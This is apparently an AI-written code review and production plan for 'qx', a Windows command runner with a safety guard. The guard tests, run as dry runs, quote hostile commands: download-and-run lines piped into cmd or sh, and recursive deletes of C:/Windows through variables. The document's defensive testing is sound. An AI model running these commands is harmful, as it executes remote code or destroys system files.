# qx: quality review and production plan (2026-11-09)

Reviewed tree: branch `review/full-codebase`, commit `0d3fbe9`, plus 24 uncommitted files (+1685 / -536 lines).
Nothing in the code was changed by this review. This file is the only thing written.

## What this repo does

qx is a Windows command runner written in Rust (about 28,500 lines, two dependencies: `regex` and `serde_json`).
It has three faces: an MCP server (the protocol AI coding clients use to call tools) with two tools, `run` and `fs`;
a command line program; and a hook that Claude Code calls before every Bash command.
Its job is to run commands and file operations fast, block dangerous ones, hide secrets, and cut noisy output
so the AI model reads fewer tokens without losing facts.

Load assumed: one developer's PC, one to six AI clients open at once, each with its own long-lived `qx mcp` process,
tens of thousands of calls per week. Speed and scale are judged against that, not against a server with many users.

## How this was checked

- Haiku sub-agents mapped the code first (file sizes, process spawns, locks, caches, panics, tests). Their line numbers
  are used below only where I re-read the lines myself.
- I built a fresh release exe from this tree, copied it out of `target\`, and measured it over MCP with a small
  script (20 read-only calls, 12 runs each). The installed `~/.cargo/bin/qx.exe` was not touched.
- I read the model-facing text of 14 typical replies.
- The guard was probed only with `qx check` (a dry run). No dangerous command was run.
- Two separate review passes ran with fresh context: one against the repo's own written rules (Standards), one against
  the 2026-11-08 audit document (Spec). Their reports are in their own sections and are not merged with mine.
- The test suite was run with default threads. See finding 6 for what happened.

## Measurements (fresh release exe, client `claude-code`)

First reply after starting the process: 16.6 ms. `initialize` reply: 755 bytes. Tool list: 3,710 bytes.

| Call | Median ms | p90 ms | Reply bytes |
|---|---|---|---|
| run `echo` (built in) | 0.5 | 0.6 | 3 |
| run `ls` (built in) | 0.8 | 0.8 | 182 |
| run `git --version` | 35.7 | 38.1 | 29 |
| run `git status` | 46.4 | 53.8 | 597 |
| run cmd line `echo a && echo b` | 18.7 | 21.1 | 5 |
| run PowerShell line | 65.8 | 377.7 | 78 |
| run bash pipeline `git log --oneline -5 \| wc -l` | 77.9 | 95.1 | 2 |
| run `cargo --version` | 24.2 | 31.2 | 36 |
| run `node -e 1` | 40.8 | 45.7 | 13 |
| run `python -c pass` | 67.5 | 76.9 | 13 |
| fs read `Cargo.toml` | 0.4 | 0.5 | 817 |
| fs read `src/fsops.rs` (2000 lines) | 1.1 | 1.2 | 48,042 |
| fs stat | 0.4 | 0.4 | 84 |
| fs list `src` | 0.3 | 0.3 | 340 |
| fs glob `src/**/*.rs` | 0.3 | 0.3 | 448 |
| fs glob `**/*.md` | 0.7 | 0.7 | 2,715 |
| fs grep `fn main` (whole repo) | 35.5 | 38.1 | 8,048 |
| fs grep regex `Regex::new\(` | 41.0 | 45.5 | 2,338 |
| fs grep `let ` in `src` | 2.0 | 2.0 | 13,149 |
| fs batch of 5 reads | 1.4 | 1.6 | 12,643 |

The Claude Code hook costs 6.7 to 8.2 ms per Bash call (worst seen 17.8 ms).

What the numbers say:

1. Everything qx does inside its own process is already under 2 ms. There is almost nothing left to win there.
2. Anything that starts another program costs 17 to 80 ms. That floor is Windows process creation plus three
   antivirus products on this PC. qx can only win here by not starting a process at all.
3. The biggest waste is not time. It is reply size: a whole-repo search returns about ten times more text than it
   should (finding 5).

## Scorecard: every area

Grades: A = nothing to do, B = good with known gaps, C = works but holds the product back, D = broken or blocking.
"Read" says how well I know the area: full = I read the code, part = I read the changed or risky parts, map = scout map and measurements only.

| Area | Lines | Read | Grade | Judgement | Next action |
|---|---|---|---|---|---|
| Guard (`guard.rs`) | 3,161 | part | B | Core denials work (force push, Windows folder, download piped to `sh`). One real hole (`| cmd`), fixed in the tree. One function of about 340 lines. | Finding 3 |
| Secret hiding (`redact.rs`) | 851 | part | B | Keys and connection strings are masked. One pattern leaks. `fs` replies are not masked on purpose (README says so). | Finding 7 |
| Output cutting (`compact.rs`) | 685 | part | B | Head and tail kept, error lines rescued, full text saved to a file. One rule hides real data. | Finding 10 |
| Smart summaries (`digest.rs`) | 1,848 | map | B | `git status` for 24 files comes back in 694 bytes with the change kind kept. Not read in depth. | none now |
| Built-in commands (`builtin.rs`) | 2,983 | part | B | 0.5 to 0.8 ms. The built-in grep is literal-only and hands real regex to the real tool, which is right. New option branches have no tests. | Standards 3 |
| Process runner (`exec.rs`) | 2,577 | part | B | Sound. Cost is the OS floor. One test can hang for minutes. | Findings 6, 11 |
| Program lookup (`resolve.rs`) | 1,193 | map | B | Not read. Cache has no size limit (scout); fine for one PC. | none now |
| npm and Python shortcuts (`npm.rs`, stubs) | 902+ | map | not judged | Only timed: node 41 ms, python 68 ms. | none now |
| MCP server (`mcp.rs`) | 1,967 | part | B | Small handshake, small tool list. One reply limit has a wrong name and cuts `mode:"full"` too hard. Tests share global state. | Findings 6, 14 |
| Client detection (`client.rs`) | small | part | B+ | Per-thread client state with a test lock. The lock is not used everywhere it is needed. | Finding 6 |
| File tool (`fsops.rs`) | 4,414 | part | Speed A, output C, structure C | Sub-millisecond. Searches folders git ignores. Unknown options are dropped without a word. One file does seven jobs. | Findings 5, 8, 15 |
| File index (`index.rs`) | mid | part | B- | Watches the folder and rebuilds after a watcher overflow, which is correct. Has no tests of its own. | Finding 17 |
| Warm start (`warmup.rs`) | small | map | not judged | No tests. Not read. | Finding 17 |
| Claude hook (`hook.rs`) | 1,376 | map | B | 7 to 8 ms per call. One ignored test, one known config-folder gap from the last audit. | Finding 17 |
| Client setup (`src/setup`) | 5 files | part | B | Careful: refuses files it cannot read, keeps the first backup. One delete has no backup. Same "keep the user's value" rule written three times. | Finding 12 |
| Deploy and doctor | small | map | B | Doctor correctly says the installed exe is stale. Deploy not read. | Finding 2 |
| Fuzz tests | in tree | map | B+ | Guard and text pipeline fuzz tests exist and pass. | none |
| CI (`.github/workflows/ci.yml`) | 1 file | full | D | Red on master for the last five runs. Tests have not run on master since 2026-10-23. No speed check. | Findings 1, 9 |
| Docs (README, six MD files) | - | part | B | Mostly true and short. Three places are now wrong. | Finding 13 |
| pi integration (`integrations/pi`) | 344 | map | not judged | Has Node tests in CI. Not read. | none now |
| Product and idea | - | - | B | The core idea works and is measurable. Its value is capped by three things outside the fast path: the installed exe is old, half the edits still use the native tool, and there are no agreed targets. | Plan batches 3, 6, 11 |

## Findings

### Must fix

1. **The work is not saved, and master is red** (whole tree; `.github/workflows/ci.yml`)
   - **What this is:** 24 changed files hold the whole last audit's fixes. CI is the automatic check that runs on GitHub.
   - **Problem:** None of it is committed. The last five CI runs failed at the lint step (Clippy), so the test step
     never ran. The lint fixes exist only in the uncommitted files. Local `master` is an old branch with no shared
     history with this one; the real base is `origin/master`.
   - **Fix:** After finding 6 is fixed, commit in a few themed commits on a branch from `origin/master`, open a pull
     request, and get CI green. Then point local `master` at `origin/master`.
   - **If we skip it:** One bad `git checkout` or disk problem loses about 1,700 lines of work, and nobody can tell
     whether master works.

2. **Every client still runs the old exe** (`~/.cargo/bin/qx.exe`)
   - **What this is:** The installed program that all AI clients start.
   - **Problem:** `qx doctor` reports it as stale. Proof from this session: I passed `context: 5` to `fs grep` on the
     live server and got no context lines, while this tree handles it at `src/fsops.rs:1947`.
   - **Fix:** After CI is green, run the repo's deploy step and keep the rollback copy. Needs your go-ahead.
   - **If we skip it:** Every fix in this tree, including the security ones, helps nobody.

3. **A download piped into `cmd` is allowed** (`src/guard.rs:918-923`)
   - **What this is:** The guard blocks "download a script and run it at once", for example `curl ... | sh`.
   - **Problem:** The list of programs that run what they are given has `sh`, `bash`, `powershell`, `pwsh` and
     others, but not `cmd`. `qx check "curl http://x/a.bat | cmd"` answers `ALLOW`, while the same line with `sh` is `DENY`.
     On Windows, `cmd` is the most likely target.
   - **Fix:** Add `"cmd"` to `reads_code` and one test row. One line of code.
   - **If we skip it:** The one platform qx is built for has the weakest version of this rule.

4. **Withdrawn: deleting through a variable is already blocked** (`src/guard.rs:623-633`)
   - **What this is:** The guard refuses to delete system folders, also when the path sits in a variable.
   - **What I first reported:** `X=C:/Windows rm -rf $X` only warns, so I called it a hole.
   - **What is true:** I re-tested with the fresh exe. `X=C:/Windows; rm -rf $X`, `X=C:/Windows && rm -rf $X` and
     PowerShell `$p = "C:\Windows"; Remove-Item -Recurse $p` all give `DENY`. The line I first tried has no `;` or
     `&&`, so in bash `$X` is expanded before the assignment applies, and qx cannot know the value. A warning is right.
     The Spec reviewer's item for audit finding 7 was a false alarm for the same reason.
   - **Fix:** None. A test row for the three `DENY` forms would pin it, if you want one.
   - **If we skip it:** Nothing.

5. **Search looks inside folders git ignores** (`src/fsops.rs:2960-2985`, `:2467`)
   - **What this is:** `fs grep` and `fs glob` skip a fixed list of folders (`node_modules`, `target`, and so on).
   - **Problem:** They do not read `.gitignore`. In this repo `fs grep "fn main"` returns 67 matches in 45 files
     (8,048 bytes). Git says only 7 matching lines are in files that are tracked or new; the rest sit in ignored
     folders such as `scratch/`, `.worktrees/` and `.superpowers/`. `fs glob **/*` finds 1,652 paths where git tracks 40.
     Old copies of the source under `.worktrees/` show up as if they were the real code.
   - **Fix:** When the index is built (already in the background), ask git once for ignored folders
     (`git ls-files -oi --exclude-standard --directory`), add them to the skip set, and name them in the existing
     "not searched" note. `all=true` and an explicit `path` inside such a folder still search it. No git: today's list.
   - **If we skip it:** About 90% of a broad search reply is noise the model pays for, and it can edit a stale copy.

6. **Tests fail or hang depending on what runs beside them** (`src/fsops.rs:4303`, `src/exec.rs:2406-2436`, `src/mcp.rs` tests)
   - **What this is:** 422 unit tests run in parallel in one process.
   - **Problem:** In a full run today, `fsops::tests::write_and_edit_replies_count_the_lines_they_changed` failed;
     alone it passed 3 of 3 times. It checks reply text that depends on a global "which client" setting other tests
     change. In the same run, `exec::tests::a_parked_powershell_answers_like_a_cold_one` was still running after
     nine minutes, when I stopped the run: it retries up to 20 times with a 60 second wait each. `Handoff.md` already records an MCP test
     failing 2 of 3 runs. CI runs the suite with default threads.
   - **Fix:** Take the existing `client::lock_global()` in every test that sets or reads the client (the fsops reply
     tests and the MCP tests at `mcp.rs:1337` and `:1474`). Give the PowerShell test one total time limit of about
     90 seconds and a clear failure message.
   - **If we skip it:** As soon as the lint step is fixed, CI goes red at random, and a red CI gets ignored.

### Should fix

7. **A password with `#` in a database URL is shown** (`src/redact.rs:210`)
   - **What this is:** Output like `postgres://user:password@host` gets its password replaced by `***`.
   - **Problem:** The scan stops at `#`. `postgres://app:s3cr#etPass@db/x` is printed unchanged; without the `#` it is masked.
   - **Fix:** Remove `b'#'` from the stop list on that line and add the case to the test table at `redact.rs:753`.
     The worst side effect is masking a few extra characters in a rare URL.
   - **If we skip it:** A real password can land in the model's context and in logs.

8. **Unknown options are dropped without a word** (`src/fsops.rs` argument handling)
   - **What this is:** `fs` takes options such as `ignore_case`, `context`, `max_matches`.
   - **Problem:** A wrong or unsupported option is ignored silently. Today's proof is finding 2: `context` on the old
     server changed nothing and the reply did not say so. The same happens with a typo such as `case_insensitive`.
     The model gets a believable but wrong answer.
   - **Fix:** In the one place arguments are read, collect keys that no op knows and add one line:
     `[qx] ignored: case_insensitive`. One check, one test.
   - **If we skip it:** Wrong answers that look right, which is the worst kind for an AI client.

9. **No benchmark and no targets** (`Goal.md`, CI)
   - **What this is:** The stated goal is "ultra speed" and "fewer tokens".
   - **Problem:** Nothing in the repo measures either. `Goal.md` has "success measures: TBD". A change that makes
     replies twice as large or calls twice as slow would pass CI.
   - **Fix:** Check in the 76-line script used for the table above as `scripts/bench_mcp.py`. Put the table in
     `Goal.md` as the baseline once you agree the targets. Let CI print the table on every run, with no pass or fail at first.
   - **If we skip it:** "Fast" and "token-saving" stay opinions.

10. **A long column of numbers is replaced by its first and last line** (`src/compact.rs:144-185`)
    - **What this is:** When output is too long, runs of 8 or more lines that differ only in digits are folded into one marker line.
    - **Problem:** That is right for progress lines. It is wrong when the digits are the content: `seq 400`, a list of
      ids, a column of sizes. The reply is `1`, a marker, `400`. The normal cut would have kept 140 lines.
    - **Fix:** Fold a run only when its lines contain at least one letter. One condition, one test.
    - **If we skip it:** The model must read the saved file to get data it asked for, which costs a second call.

11. **Shell lines cost 20 to 80 ms where a direct call costs under 1 ms to 36 ms** (`src/exec.rs`, `src/guard.rs:2066`)
    - **What this is:** A `command` string with `|` or `&&` is handed to cmd, Git Bash or PowerShell.
    - **Problem:** Each shell is an extra process. PowerShell is the worst: median 66 ms, p90 378 ms.
      I did not find the cause of the 378 ms.
    - **Fix:** First measure what share of real calls take the shell path (the stats file already records calls).
      If it is large, run simple `a && b` and `a | b` lines inside qx using the splitters that already exist
      (`guard.rs split_segments`, `exec.rs split_simple`). Do not build this before the measurement.
    - **If we skip it:** Nothing breaks. This is the largest remaining speed win, if the share is large.

12. **pi setup deletes old extension files with no backup** (`src/setup/pi.rs:125-127`, `src/setup/mod.rs:367-373`)
    - **What this is:** For pi 0.99 or newer, setup removes the old `qx.js` extension and its bridge.
    - **Problem:** Every other change in setup makes a `.qx-bak` copy first. This path removes the file before the
      backup step. A user who edited that `qx.js` loses the edit.
    - **Fix:** In `apply`, do the backup copy before the "empty text means delete" branch.
    - **If we skip it:** Rare, but it is silent loss of a user's file by an installer.

13. **Three doc lines are now false** (`Gatcha.md:31`, `Map.md`, `Handoff.md:13`)
    - **What this is:** The repo keeps one home per fact in short MD files.
    - **Problem:** `Gatcha.md:31` says writes to the session scratchpad are refused; this tree allows them
      (`fsops.rs:186`). `Map.md` does not mention that `fs` now guesses the `op` when it is missing. `Handoff.md`
      lists audit findings 23, 25 and 26 as both done and open. Also, your own `~/.claude/QX.md` says MCP output is
      redacted, while README line 273 says `fs` replies are not; that file is yours, so I only point it out.
    - **Fix:** Correct each line in the same commit as the code it describes.
    - **If we skip it:** The next agent trusts the docs and works around a limit that no longer exists.

14. **One reply limit is written as four numbers, and `mode:"full"` is cut at 22 KB** (`src/mcp.rs:1133-1138`, `:1213`; `src/fsops.rs:38`, `:40`, `:248`)
    - **What this is:** Clients reject replies above a size, so qx cuts them.
    - **Problem:** The limit appears as `48_000`, `49_000`, `40_000` and `22_000` in four places. The 22 KB one is
      named `FULL_TEXT_CAP` and also applies when the caller asked for `mode:"full"`, while one `fs read` may return 48 KB.
      The last audit asked for 64 KB on non-full output only.
    - **Fix:** One constant with a name that says what it is (the client's reply limit), the others derived from it.
      Let `mode:"full"` use the same limit as `fs read`.
    - **If we skip it:** "Full" returns less than half of what the client accepts, and the next limit change misses one of the four.

15. **`fsops.rs` is 4,414 lines doing seven jobs** (`src/fsops.rs`)
    - **What this is:** The file holds read, write, edit, glob, grep, list, stat, path rules, reply text and 1,170 lines of tests.
    - **Problem:** Every `fs` change touches this one file, and other agents edit this tree at the same time.
      `index.rs` and `warmup.rs` have no tests of their own.
    - **Fix:** Move code, do not rewrite it: `fsops/search.rs` (glob, grep, walk), `fsops/change.rs` (write, edit),
      `fsops/reply.rs` (limits and framing). Do it right after the commit in batch 3, in one move-only commit.
    - **If we skip it:** Slower reviews and more merge conflicts. No user-facing harm.

16. **Half of all edits still go through the native tool** (product; `Handoff.md` usage data)
    - **What this is:** qx only saves time and tokens for calls that reach it.
    - **Problem:** Since 2026-10-24: native Edit 3,426 calls against qx edit 1,734; native Write 1,151 against qx 235.
      I do not know why.
    - **Fix:** Find the cause before changing anything: split the counts by client and by reason (file outside the
      workspace, a failed qx edit followed by a native one, or plain habit of the model).
    - **If we skip it:** Work on making qx edits faster reaches one edit in three.

17. **Open items carried over from the 2026-11-08 audit** (see the Spec section for the list)
    - **What this is:** The last audit had 40 findings. Most are fixed in this tree.
    - **Problem:** Some are not: the slow grep path reads a line with no length limit (`fsops.rs:2445`), so a 2 GB
      one-line file is loaded into memory; an absolute glob pattern outside the working folder answers "No files
      found." instead of saying why; built-ins started from the command line have no time limit
      (`set_deadline` is only called in `mcp.rs`); the index "building" flag has no guard if the build thread dies.
    - **Fix:** Take them in the order above, one small change and one test each.
    - **If we skip it:** Each one is a rare case, but the first is a way to make a long-lived server use gigabytes of memory.

### Nice to have

18. **The line count on a multi-edit reply is an upper limit shown as exact** (`src/fsops.rs:1522-1532`)
    - **What this is:** Edit replies end with `(+N -M lines)`.
    - **Problem:** For two edits far apart, everything between them counts: one line changed at line 1 and one at
      line 1000 reads as about `+1000 -1000`. The code comment says so; the reply does not.
    - **Fix:** For `edit`, count from the replacements themselves, which are known. Or print `up to`.
    - **If we skip it:** A model may think it rewrote the file and re-read it to check.

19. **Notes print zero counts** (`src/fsops.rs` grep reply)
    - **What this is:** `[qx] skipped 167 binary, 0 large, 0 unreadable file(s).`
    - **Problem:** The zeros are tokens with no information, on every search reply.
    - **Fix:** Print only non-zero parts.
    - **If we skip it:** A few wasted tokens per search.

20. **Release build uses optimisation level 2** (`Cargo.toml`)
    - **What this is:** The compiler setting for the shipped exe.
    - **Problem:** Level 3 may make grep and the output filters a little faster. Nobody has measured it.
    - **Fix:** After finding 9, build once with level 3 and compare the table. Keep it only if it wins.
    - **If we skip it:** Nothing.

Left out: about 10 smaller points, all listed in the Standards section as judgement calls.

Also judged and found fine, so they are not findings: `cat evil.txt | sh` is allowed (running a local file is
normal use, not a download); the built-in grep is not a second regex engine; the unlimited caches are fine for one PC.

## Standards

Sources: `CLAUDE.md`, `Gatcha.md`, `Mistake.md`, `Map.md`, and a fixed list of common code smells.
Compared: uncommitted tree against `HEAD`. Files this pass did not fully read: `setup/jsonc.rs`, `setup/pi.rs`,
`guard.rs`, `compact.rs`, `hook.rs`, `mcp.rs`, `deploy.rs`, `digest.rs`, the lower half of `exec.rs`.

Hard breaches of a written rule:

1. `Gatcha.md:31` is now false: writes to the session scratchpad are allowed through `scratch_root` (`fsops.rs:186`).
   Rule broken: "one home per fact", and the file's own heading "do not claim otherwise". Verified by me.
2. `Map.md` does not mention `op` inference, and the README `fs` text and the schema text in `mcp.rs` do not agree.
   Rule broken: `CLAUDE.md` "new or moved feature, update `Map.md` in the same change". The `Map.md` part is verified by me.
3. `Mistake.md:5` says every option flag needs a test that flips it. The new built-in grep branches (flags after
   the pattern, the decline for a pattern starting with `/`, the decline for invert or non-ASCII) have no such test.

Judgement calls (possible smells, not breaches):

- Name that no longer fits: `FULL_TEXT_CAP = 22_000` (`mcp.rs:1213`).
- One fact in four places: the client reply limit as `48_000`, `49_000`, `40_000`, `22_000`.
- Repeated `if lean() { ... } else { frame }` at `fsops.rs:1188`, `1250`, `1296`, `1451`.
- Values that travel together with no type: `(max_lines, head, tail)` through `digest::plain_budget` (`digest.rs:42`);
  `write_entry` with 7 parameters (`builtin.rs:709`) mirroring `LsEntry`.
- Same policy written three times: the "keep the user's value" rule in `setup/toml.rs:137/152/196`,
  `setup/yaml.rs:331/354/369` and `setup/mod.rs:312`.
- Two helpers for one job: `same_path` (`setup/mod.rs:405`) and `norm_path` (`resolve.rs:563`).
- Leftovers: `rewrite_powershell(cmd, budget: Option<u64>)` (`hook.rs:683`), a test-only `rewrite_bash` shim
  (`hook.rs:167-168`), two `if` chains on `name` at `builtin.rs:50` and `:55`, an unused `ProgressSlot` alias (`exec.rs:1123`).

## Spec

Spec: `docs/review/2026-11-08-qx-full-audit.md` (40 findings). Compared: uncommitted tree against `HEAD`.
Checked: findings 1-7, 9-24, 26-33, 38, 39(h)(i)(j), 40(a)(b)(c)(f)(g)(i)(j)(o).
Not checked: 8, 25, 34, 35, 36, 37, 39(a)-(g)(k), 40(d)(e)(h)(l)(m)(n)(p).
"Verified" below means I reproduced it myself with the fresh exe or by reading the lines.

(a) Asked for, missing or partial:

- Finding 7: reported as `X=C:/Windows rm -rf $X` still only warning. Withdrawn after I re-tested: the real forms
  (`X=C:/Windows; rm -rf $X`, PowerShell `$p=...; Remove-Item $p`) are `DENY` (see finding 4 above).
- Finding 5: `curl http://x/a.bat | cmd` is allowed; `reads_code` (`guard.rs:918`) has no `cmd`. Verified.
  `cat evil.txt | sh` is allowed too. Verified; I judge that one acceptable.
- Finding 14: an absolute glob such as `C:/other/**/*.rs` still answers "No files found." (`relative_pattern`, `fsops.rs:3007`).
- Finding 22: `set_deadline` is called only at `mcp.rs:1262` and `:1266`; built-ins run from `main.rs` have none. Verified by search.
- Finding 33: the global lock was not added to the tests at `mcp.rs:1337` and `:1474`; the end-of-input test was
  loosened to accept `timed_out: true`. Finding 6 above shows the effect.
- Finding 38, redaction part: `postgres://app:s3cr#etPass@db/x` still leaks. Verified.
- Finding 39(h): no guard that clears the index `BUILDING` flag if the build thread dies (`index.rs:493-510`).
- Finding 39(j), 40(a)(b)(c): not present, including a cancel check on `fs` calls.
- Finding 12: the long-line limit is 16 MB; the audit said about 1 MB. The slow path has no limit at all (`fsops.rs:2445`).
- Finding 3: `exec.rs:739` and `:827` check only `\n`, not `\r`.
- `Handoff.md` lists findings 23, 25 and 26 as both done and open.

(b) In the diff, not asked for:

- `lean()` reply framing; `MAX_REPLY_BYTES` 49,000; batch limit cut from 256 KB to 40 KB; `FULL_TEXT_CAP` cut from
  96 KB to 22 KB (also for `mode:"full"`); `op` inference; grep context options; writes under `%TEMP%\claude`;
  skipping no-op writes and edits; schema trimming; dev build at optimisation level 2; the `rd /s /q` splitting
  extended to `copy`, `move`, `xcopy`, `robocopy` (`guard.rs` near `:648`).
- My view: most of these serve the goal (fewer tokens, fewer round trips). The two that need a second look are the
  22 KB cut on `mode:"full"` (finding 14) and `op` inference, which should be in `Map.md`.

(c) Done, but looks wrong:

- `setup/pi.rs:125-127` deletes the old extension with no backup. Verified (finding 12).
- `line_delta` reports about `+1000 -1000` for one-line edits at line 1 and line 1000. Verified as a documented
  upper limit (finding 18).
- `setup/yaml.rs`: the Hermes block is said to match a nested `timeout:` under `tools:` as if it were the server's own.
  Not verified: I could not find the quoted `starts_with("timeout:")` in the file.

Summary per axis. Standards: 3 hard breaches and about 10 judgement calls; the worst is the false line at `Gatcha.md:31`.
Spec: 11 missing or partial, 10 unrequested changes, 3 "looks wrong"; the worst is the `| cmd` hole (audit finding 5); the finding 7 item was withdrawn.

## Verdict

Verdict: not shippable until reviewed and committed. Fixes for 6, 3, 7, 10 and 12 are done in the tree (see Progress below); next do 1 and 2. After that, 5 is the biggest win for the goal.

Lean: no large deletion found. About 60 to 80 lines can go by merging the three "keep the user's value" copies,
`same_path` into `norm_path`, the four limit numbers, and the leftovers listed under Standards.

Not checked: `resolve.rs`, `npm.rs`, `warmup.rs`, `deploy.rs`, `digest.rs` and `integrations/pi` in depth; clients other
than Claude Code and one Cursor handshake; the cause of the 378 ms PowerShell p90; the Hermes YAML claim; the 16 audit
items listed as not checked; the live behaviour of the parked-PowerShell fix outside tests (the cause was test-only, see Progress).

## Progress (2026-11-09)

Batches 1 and 2 are done in the working tree. Nothing is committed, pushed or deployed.

- **Suite is deterministic.** Three full runs: 421 passed, 0 failed, 2 ignored, 24 to 42 s each. Before: one test failed every run and could hang 9 minutes.
  - Two fsops reply tests raced on the global client. They now pin `Client::Generic` through `client::scoped`.
  - `a_parked_powershell_answers_like_a_cold_one` failed only in the full run. Cause: the `run_cli` tests in `main.rs` set the global `INHERIT_STDIN` (a test run's stdin is not a terminal), and the parked PowerShell refuses any call when it is set. Fix: `run_cli` no longer sets it under `cfg(test)` (`src/main.rs`). The test also has a 120 s cap now, so a regression fails instead of hanging.
- **Guard hole closed.** `curl http://x/a.bat | cmd` is now DENY (`cmd_reads_stdin` in `src/guard.rs`); `curl https://x | cmd /c findstr foo` and `cmd /c dir` stay allowed. Checked with a fresh release exe through `qx check`, plus flip tests.
- **Finding 4 withdrawn.** `X=C:/Windows rm -rf $X` is already DENY and bash expands `$X` before a prefix assignment.
- **Redaction.** A `#` inside a database URL password is masked now; `https://example.com/docs#section` is untouched.
- **Setup.** Removing a file keeps the first `.qx-bak` copy before deleting it.
- **Compact (finding 10).** `collapse_similar` no longer folds a run of bare numbers (`1..400`); lines need a letter to fold. Unit test added and passing.
- **Lint.** `cargo clippy --release --all-targets --locked -- -D warnings` is clean.
- **Batch 5 (search replies carry signal only), code and tests done, 425 pass.**
  - Finding 5: glob and grep skip folders git ignores (`git ls-files -o -i --exclude-standard --directory`, cached 30 s, 3 s cap, no git or no repo means no extra skips). They are named in the "not searched" note. `all=true`, or a pattern/include that names the folder, still searches it. The live index drops events inside such folders (`index.rs`).
  - Finding 8: an option no `fs` operation reads (a typo such as `ignorecase`) now adds `[qx] ignored (not fs options): <keys>`.
  - Finding 19: the grep skip note lists only counts above zero.
  - Measured with a fresh release exe over MCP, this repo: `fs grep "fn main"` 8,048 bytes (117 lines, 67 matches in 45 files) before, 1,300 bytes (20 lines, 10 matches in 5 files) after. The 3 "not searched" notes name `.remember, .serena/cache, .superpowers, .trail/cache, .worktrees, scratch, target, target-dev`. The remaining 10 matches are real text in tracked files (docs, tests, source). Not run: a timing comparison (the git call adds about 32 ms once per 30 s per root).
  - Tests: `search_skips_folders_git_ignores_and_says_so`, `search_outside_a_git_repo_skips_nothing_extra`, `an_option_no_operation_reads_is_named_not_silently_dropped`, `the_skip_note_counts_only_what_was_skipped`.
- **`lock_global()` flake (audit finding 33) was real.** With `--test-threads=8`, `a_non_string_argument_is_an_error_not_a_different_command` and `wide_lines_within_the_line_budget_...` failed about half the runs: a server test sets the process-wide `SHUTDOWN`, which cancels the id-9 call. Both now hold `server_lock()`. Then 8 runs at 8 threads and 2 at default threads: all green.
- **Batch 7 (cuts never hide asked-for data), code and tests done, 427 pass, clippy clean.**
  - Finding 14: `mode:"full"` no longer caps at a fixed 20 KB. `stream_caps` in `src/mcp.rs` gives each stream what the client accepts (`CLIENT_REPLY_BYTES` 49,000 minus 1,500 frame; halved when the shape duplicates the text), and gives one stream the other's unused room. Spool file only when a stream really exceeds its cap.
  - Finding 18: `CLIENT_REPLY_BYTES` in `src/fsops.rs` is the one client limit; the read and batch limits derive from it. A batch edit reports `min(whole-file delta, sum of per-step deltas)`, so two far-apart edits report `+1 -1`, not everything between.
  - Tests: `full_mode_returns_what_the_client_accepts_and_caps_the_rest`, `two_far_apart_edits_report_the_lines_they_changed_not_everything_between`. Not run: `mode:"full"` against a release exe over MCP (unit test only).
- **Batch 8 step 1 (share of calls on the shell path): measured, step 2 not worth building.**
  - Source: 2,838 tool calls in this repo's Claude transcripts (`scratchpad/shell_share.py`, `splittable.py`). Caveat: most are native `Bash` calls from before the qx tools were loaded; the 342 `mcp__qx__run` command strings are the fair sample.
  - Of those 342 `run` command strings: 57 need no chain (simple), 51 (15%) use only `&&` or `|` and nothing else a shell is needed for, 226 (66%) also use redirects, `;`, `$var`, globs or `cd`, 8 are multi-line. So a splitter for `a && b` and `a | b` would cover 15% of calls; the 66% still need the shell.
  - Cost per shell call, measured with the release exe: `qx echo a` 7 ms (in-process), `qx -c "echo a && echo b"` 16 ms. A saving of about 9 ms on 15% of calls is about 1.4 ms per call on average.
  - Decision: do not build step 2. Reopen only if `Goal.md` sets a target the shell path blocks, or if the 66% turns out to be mostly `2>&1` and `cd` (those two are the cheap ones to special-case first).
- **Batch 10 (old audit items), code and tests done, 431 pass, clippy clean.** One test each:
  - Slow grep path (`scan_stream` in `src/fsops.rs`): a line is read at most 16 MB (`LONG_LINE`), the rest is read past and dropped (`skip_line`). Before, `read_until` held a 2 GB one-line file in memory. Test: `the_line_by_line_path_does_not_hold_a_huge_single_line_either` (20 MB line, matches on lines 1 and 3).
  - Absolute glob/include outside the folder (`outside_note`): "No files found." / "No matches found." now adds `[qx] an absolute pattern lies outside the searched folder ...; give that folder as path`. Test: `an_absolute_pattern_outside_the_folder_says_why_it_found_nothing`.
  - Built-ins run from the command line (`run_builtin` in `src/main.rs`): `--timeout` is their deadline, exit 124 and "timed out" like a child. Test: `a_builtin_run_from_the_command_line_stops_at_the_timeout_flag`.
  - Index `BUILDING` flag (`BuildDone` drop guard in `src/index.rs`): a panicking build leaves the list. Test: `a_build_that_panics_does_not_stay_on_the_building_list`.
  - Audit finding 3 (`\r` in `exec.rs:739`, `:827`): decided not to change. Checked with `cmd /d /c "echo a\recho b"`: a bare CR does not start a second command (output `aecho b`), and CRLF contains `\n`, which is already refused. No line is dropped silently.
  - Still open from the audit, all in batch 3 (needs your OK): the `Handoff.md` lines that list 23, 25 and 26 as both done and open, and `Gatcha.md:31`.
- **Next, no sign-off needed:** nothing left except batch 9 (after batch 6 numbers).
- **Needs your OK:** batch 3 (commit, PR), batch 4 (deploy), batch 6 (targets), batch 11.

## Production plan

Order matters: tests first, so CI can be trusted; then the small security fixes; then save and ship; then the
wins for the goal. Each batch is one pull request or one commit group and ends with a proof that can be run.

| Batch | Goal | Findings | Files | Proof it is done | Needs your OK |
|---|---|---|---|---|---|
| 1 | Tests give the same answer every run | 6 | `src/fsops.rs` tests, `src/mcp.rs` tests, `src/exec.rs:2406` | Copy the test exe out of `target\`, run the full suite 5 times with default threads: 5 green, each under 2 minutes | no |
| 2 | Close the small safety holes | 3, 7, 12 (4 withdrawn) | `src/guard.rs`, `src/redact.rs`, `src/setup/mod.rs` | One new test per fix that fails before and passes after; `qx check "curl http://x/a.bat \| cmd"` gives `DENY` | no |
| 3 | Save the work, green CI | 1, 13 | whole tree, `Gatcha.md`, `Map.md`, `Handoff.md` | Pull request from a branch on `origin/master`; lint, tests, pi tests and the 1.82 build all green | yes: commit, push, PR |
| 4 | Clients get the new exe | 2 | deploy step | `qx doctor` no longer says stale; `fs grep` with `context: 2` on the live server shows context lines | yes: deploy |
| 5 | Search replies carry signal only | 5, 8, 19 | `src/index.rs`, `src/fsops.rs` (`skip_dir`, notes, argument reading) | In this repo `fs grep "fn main"` returns the 7 real lines plus a note naming the ignored folders; `all=true` still returns everything; a typo option yields an `ignored:` line; bench table shows the byte drop | no |
| 6 | Speed and size are measured | 9, 20 | `scripts/bench_mcp.py`, `Goal.md`, `.github/workflows/ci.yml` | CI log shows the table; `Goal.md` holds the baseline and your targets | yes: the targets |
